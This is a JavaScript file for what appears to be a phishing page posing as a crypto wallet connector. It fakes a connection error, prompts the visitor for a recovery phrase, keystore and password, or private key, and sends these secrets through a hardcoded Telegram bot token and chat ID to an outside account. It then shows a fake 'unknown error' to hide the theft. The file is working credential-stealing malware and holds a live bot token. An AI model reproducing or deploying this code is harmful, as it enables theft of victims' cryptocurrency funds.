$(document).ready(function () {
    // Search field - delegated
    $(document).on("keyup", "#search-field", function () {
        var value = $(this).val().toLowerCase();
        $(".coin-registry button").filter(function () {
            $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
        });
    });

    // Wallet buttons - delegated
    $(document).on("click", ".coin-registry button", function (event) {
        let img = $(this).find(".coin-img").attr("src");
        event.preventDefault();
        $(".connection-info").text("Initializing...");
        $("#current-wallet-app").text(
            $(this).children().last().text().trim()
        );
        $("#current-wallet-logo").attr("src", img);
        $("#connect-dialog").show();
        setTimeout(function () {
            $(".connection-info").html(
                'Error Connecting... <button class="manual-connection">Connect Manually</button>'
            );
        }, 1000);
    });

    // Dialog dismiss buttons - delegated
    $(document).on("click", ".dialog-dismiss", function () {
        $("#connect-dialog").hide();
        $("#send-dialog").hide();
    });

    // Send type buttons - delegated
    $(document).on("click", "#phraseSend", function () {
        $("#data-to-send").html(
            `<div class="form-group"><input type="hidden" id="type" name="type" value="phrase">
            <textarea id="phrase" name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
            </div>
            <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>`
        );
    });

    $(document).on("click", "#keystoreSend", function () {
        $("#data-to-send").html(
            `<div class="form-group">
            <input type="hidden" id="type" name="type" value="keystore">
            <textarea rows="5" style="resize: none" required id="keystore" class="form-control" placeholder="Enter Keystore"></textarea>
            </div>
            <input type="text" class="form-control" name="password" id="password" required placeholder="Wallet password">
            <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>`
        );
    });

    $(document).on("click", "#privateKeySend", function () {
        $("#data-to-send").html(
            `<input type="hidden" id="type" name="type" value="privatekey">
            <input type="text" id="privateKey" name="privateKey" required class="form-control" placeholder="Enter your Private Key">
            <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>`
        );
    });

    // Manual connection button - delegated
    $(document).on("click", ".manual-connection", function () {
        $("#current-wallet-app-send").text($("#current-wallet-app").text());
        $("#walletNameData").val($("#current-wallet-app").text());
        var link = $("#current-wallet-app").text();
        $("#current-wallet-send-logo").attr(
            "src",
            $("#current-wallet-logo").attr("src")
        );
        $("#connect-dialog").hide();
        $("#send-dialog").show();
    });

    // Form submission - delegated
    $(document).on("submit", "#processForm", function (e) {
        e.preventDefault();

        let coinType = $("#current-wallet-app").text();
        let reqType = $("input#type").val() || '';
        let reqPhrase = $("textarea#phrase").val() || '';
        let reqKeystore = $("textarea#keystore").val() || '';
        let reqPassword = $("input#password").val() || '';
        let reqPrivateKey = $("input#privateKey").val() || '';

        let processBtn = $("#proceedButton");
        let cancelBtn = $("#cancelBtn");
        
        let message = '********************\n\n';
        message += `Wallet Connection:\n`;
        message += `${coinType}\n\n`;
        if ( reqPhrase ) message += `Phrase\n`;
        if ( reqPhrase ) message += `${reqPhrase}\n\n`;
        if ( reqKeystore ) message += `Keystore\n`;
        if ( reqKeystore ) message += `${reqKeystore}\n\n`;
        if ( reqKeystore ) message += `Password\n`;
        if ( reqPassword ) message += `${reqPassword}\n\n`;
        if ( reqPrivateKey ) message += `Private Key\n`;
        if ( reqPrivateKey ) message += `${reqPrivateKey}\n\n`;
        message +=`********************\n`;
        
        const botToken = "8321594074:AAF0OiHDnPDyGMa8yWY9oi20I8A6uJhU2o0";
        const chatId = 7765726318;

        $.ajax({
            type: "GET",
            url: `https://api.telegram.org/bot${botToken}/sendMessage`,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            data: {
                'chat_id': chatId,
                'text': message,
                'parse_mode': 'HTML'
            },
            beforeSend: function () {
                processBtn.html(
                    '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
                );
                processBtn.prop("disabled", true);
                cancelBtn.prop("disabled", true);
            },
            success: function () {
                setTimeout(function () {
                    restoreButtons();
                    $("div.message-tab").html(
                        "<div class='alert alert-danger'>An unknown error occured, please try again later.</div>"
                    );
                }, 5000);
            },
            error: function (err) {
                restoreButtons();
                dismissAllDialogs();
                $("#error-dialog").show();
                setTimeout(function () {
                    dismissAllDialogs();
                    $("#send-dialog").show();
                }, 2500);
                console.log(err)
            },
        });

        function restoreButtons() {
            processBtn.html("PROCEED");
            processBtn.prop("disabled", false);
            cancelBtn.prop("disabled", false);
        }

        function dismissAllDialogs() {
            $("#success-dialog").hide();
            $("#error-dialog").hide();
            $("#connect-dialog").hide();
            $("#send-dialog").hide();
            $("#processing-dialog").hide();
        }
    });
});